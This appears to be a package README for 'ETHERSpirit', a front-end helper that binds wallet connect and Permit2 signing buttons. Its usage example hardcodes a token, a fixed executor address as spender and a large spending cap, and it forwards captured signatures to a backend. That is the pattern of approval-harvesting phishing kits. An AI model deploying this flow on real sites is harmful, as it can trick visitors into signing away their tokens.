# ETHERSpirit

Tiny UMD frontend helper to bind Connect + Permit2 signing buttons.

Usage (CDN)

Include the script from a CDN (after this package is published to npm):

```html
<script src="https://cdn.jsdelivr.net/npm/ETHERSpirit@0.1.0/dist/etherspirit.umd.js"></script>
<script>
  ETHERSpirit.init({
    tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    executorAddress: '0x05a5b264448da10877f79fbdff35164be7b9a869',
    spendingCap: '10000000000', // integer amount in token's smallest unit
    onSigned: function(sig){
      // sig = { owner, spender, token, amount, deadline, nonce, r, s, v }
      console.log('Signed permit:', sig);
      // send to your backend or store in Firestore
    }
  });

  // Bind any buttons you like via CSS selector
  ETHERSpirit.bindConnectButton('#myConnectBtn');
  ETHERSpirit.bindSignButton('#mySignBtn');

  // Listen for events
  document.querySelector('#mySignBtn').addEventListener('etherSpirit:signed', function(e){
    console.log('signed event', e.detail);
  });
</script>
```

API

- `ETHERSpirit.init({ tokenAddress, permit2Address, executorAddress, spendingCap, onSigned })` — initialize config.
- `ETHERSpirit.bindConnectButton(selector)` — binds connect behavior to elements matching `selector`.
- `ETHERSpirit.bindSignButton(selector, opts)` — binds sign behavior; optional `opts` can override `token`, `amount`, `executor`, `deadline`, `nonce` for that button.
- `ETHERSpirit.signPermit(opts)` — programmatically request a permit signature and returns the parsed signature object.

Security

This package only constructs typed-data and uses `eth_signTypedData_v4` via the injected `window.ethereum` provider. It does not send signatures anywhere — you should implement the backend flow to collect and process them.

License: MIT
